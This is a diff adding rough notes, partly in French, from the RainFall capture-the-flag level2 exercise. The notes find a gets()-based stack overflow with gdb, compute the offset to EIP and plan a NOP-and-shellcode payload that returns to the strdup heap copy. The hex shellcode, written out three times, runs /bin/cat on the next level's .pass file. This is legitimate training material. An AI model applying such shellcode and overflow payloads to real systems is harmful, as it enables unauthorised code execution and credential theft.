@@ -49,3 +49,310 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhey
 ho
 Segmentation fault (core dumped)
 level2@RainFall:~$ 
+
+shellcode.c == source
+gcc shellcode.c -fno-stack-protector -ggdb -static -o shellcode
+./shellcode 
+
+/bin/sh = 2f.62.69.6e.2f.73.68 (hexa) == 0x68732f6e69622f + \0 = 0x0068732f6e69622f 
+
+execve appel systeme numero 59 = 0x3b 
+
+level2@RainFall:~$ ./level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac5
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac5
+level2@RainFall:~$ ./level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac55
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac55J����
+level2@RainFall:~$
+
+# 75 CHAR ok
+level2@RainFall:~$ ./level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac5545555555555
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac55J5555555
+# 76 CHAR overflow
+level2@RainFall:~$ ./level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac55455555555555
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac55J55555555
+Illegal instruction (core dumped)
+level2@RainFall:~$
+
+level2@RainFall:~$ gdb ./level2
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) run < <(python -c 'print("A"*76)')
+Starting program: /home/user/level2/level2 < <(python -c 'print("A"*76)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info registers
+eax            0x804a008        134520840
+ecx            0x0      0
+edx            0xbffff6dc       -1073744164
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff708       0xbffff708
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0x41414141       0x41414141
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+https://masterccc.github.io/tools/shellcode_gen/
+/home/user/level3//.pass
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+(gdb) run < <(python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2")')
+Starting program: /home/user/level2/level2 < <(python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2")')
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+(gdb) info registers eip
+eip            0x37634136       0x37634136
+(gdb)
+
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+37634136 = 7cA6
+little endian psk x86 donc 6Ac7
+
+63 octets (chars) entre le debut de la string et eip
+
+[NOPs] + [shellcode] + [adrees a mettre dans eip (adresse du buffer ou de la var d'env)]
+ ??	      60octets                    ????????????
+
+- verifier taille entre buffer et eip
+Trouver la distance exacte jusqu'à EIP (ce qu'on appelle l'offset)
+- determiner l'adresse du buffer si assez grand
+- ajouter adresse a payload et NOPs
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048358  _init
+0x080483a0  printf
+0x080483a0  printf@plt
+0x080483b0  fflush
+0x080483b0  fflush@plt
+0x080483c0  gets
+0x080483c0  gets@plt
+0x080483d0  _exit
+0x080483d0  _exit@plt
+0x080483e0  strdup
+0x080483e0  strdup@plt
+0x080483f0  puts
+0x080483f0  puts@plt
+0x08048400  __gmon_start__
+0x08048400  __gmon_start__@plt
+0x08048410  __libc_start_main
+0x08048410  __libc_start_main@plt
+0x08048420  _start
+0x08048450  __do_global_dtors_aux
+0x080484b0  frame_dummy
+0x080484d4  p
+0x0804853f  main
+0x08048550  __libc_csu_init
+0x080485c0  __libc_csu_fini
+0x080485c2  __i686.get_pc_thunk.bx
+0x080485d0  __do_global_ctors_aux
+0x080485fc  _fini
+(gdb) b *0x080484d4
+Breakpoint 1 at 0x80484d4
+(gdb) run
+Starting program: /home/user/level2/level2
+
+Breakpoint 1, 0x080484d4 in p ()
+(gdb) dis p
+0 printers disabled
+0 of 0 printers enabled
+(gdb) disassemble p
+Dump of assembler code for function p:
+=> 0x080484d4 <+0>:     push   %ebp
+   0x080484d5 <+1>:     mov    %esp,%ebp
+   0x080484d7 <+3>:     sub    $0x68,%esp
+   0x080484da <+6>:     mov    0x8049860,%eax
+   0x080484df <+11>:    mov    %eax,(%esp)
+   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>:    mov    %eax,(%esp)
+   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+   0x080484fb <+39>:    and    $0xb0000000,%eax
+   0x08048500 <+44>:    cmp    $0xb0000000,%eax
+   0x08048505 <+49>:    jne    0x8048527 <p+83>
+   0x08048507 <+51>:    mov    $0x8048620,%eax
+   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
+   0x0804850f <+59>:    mov    %edx,0x4(%esp)
+   0x08048513 <+63>:    mov    %eax,(%esp)
+   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:    movl   $0x1,(%esp)
+   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>:    mov    %eax,(%esp)
+   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:    mov    %eax,(%esp)
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret
+End of assembler dump.
+(gdb) set disassembly-flavor intel
+(gdb) disassemble p
+Dump of assembler code for function p:
+=> 0x080484d4 <+0>:     push   ebp
+   0x080484d5 <+1>:     mov    ebp,esp
+   0x080484d7 <+3>:     sub    esp,0x68
+   0x080484da <+6>:     mov    eax,ds:0x8049860
+   0x080484df <+11>:    mov    DWORD PTR [esp],eax
+   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]            <--- 0x4c(hex) = 76 (dec)
+   0x080484ea <+22>:    mov    DWORD PTR [esp],eax
+   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
+   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080484fb <+39>:    and    eax,0xb0000000
+   0x08048500 <+44>:    cmp    eax,0xb0000000
+   0x08048505 <+49>:    jne    0x8048527 <p+83>
+   0x08048507 <+51>:    mov    eax,0x8048620
+   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048513 <+63>:    mov    DWORD PTR [esp],eax
+   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1
+   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
+   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
+   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
+   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret
+End of assembler dump.
+(gdb)
+
+76 + 4(size of epb) = 80 entre epb et buffer
+
+(gdb) print $ebp - 0x4c
+$1 = (void *) 0xbffff6ec
+
+adresse du buffer 0xbffff6ec
+
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+
+[NOPs] + [shellcode] + [adrees a mettre dans eip (adresse du buffer ou de la var d'env)]
+ ??	      60octets                    ????????????
+
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+script.py
+
+level2@RainFall:~$ python /tmp/scrypt.py | ./level2
+(0xbffff6ec)
+level2@RainFall:~$
+
+car protection verfification de la variable eip pour savoir si c'est une adresse de la stack
+	if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+		printf("(%p)\n",unaff_retaddr);		// WARNING: Subroutine does not return
+		_exit(1);
+	}
+
+level2@RainFall:~$ export payload=$(python /tmp/scrypt.py)
+
+level2@RainFall:~$ nano /tmp/get_env_var_addr.c
+level2@RainFall:~$ cd /tmp/
+level2@RainFall:/tmp$ gcc get_env_var_addr.c
+level2@RainFall:/tmp$ ./a.out
+addr: 0xbffffdb0
+
+little endian
+0xbffffdb0 = /xb0/xfd/xff/xbf
+
+- recup adrr dest de strdup 
+
+[shellcode] + [NOPs] + [adrees a mettre dans eip (addr dest strdup)]
+
+(gdb) set disassembly-flavor intel
+(gdb) disassemble p
+Dump of assembler code for function p:
+   0x080484d4 <+0>:     push   ebp
+   0x080484d5 <+1>:     mov    ebp,esp
+   0x080484d7 <+3>:     sub    esp,0x68
+   0x080484da <+6>:     mov    eax,ds:0x8049860
+   0x080484df <+11>:    mov    DWORD PTR [esp],eax
+   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]
+   0x080484ea <+22>:    mov    DWORD PTR [esp],eax
+   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
+   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080484fb <+39>:    and    eax,0xb0000000
+   0x08048500 <+44>:    cmp    eax,0xb0000000
+   0x08048505 <+49>:    jne    0x8048527 <p+83>
+   0x08048507 <+51>:    mov    eax,0x8048620
+   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048513 <+63>:    mov    DWORD PTR [esp],eax
+   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1
+   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
+   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
+   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
+   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret
+End of assembler dump.
+(gdb) break *0x0804853d
+Breakpoint 1 at 0x804853d
+(gdb) run
+Starting program: /home/user/level2/level2
+hey
+hey
+
+Breakpoint 1, 0x0804853d in p ()
+(gdb) i r
+eax            0x804a008        134520840
+ecx            0x0      0
+edx            0xbffff5bc       -1073744452
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff5a0       0xbffff5a0
+ebp            0xbffff608       0xbffff608
+esi            0x0      0
+edi            0x0      0
+eip            0x804853d        0x804853d <p+105>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+
+adresse de la zone memoire est 0x804a008
+
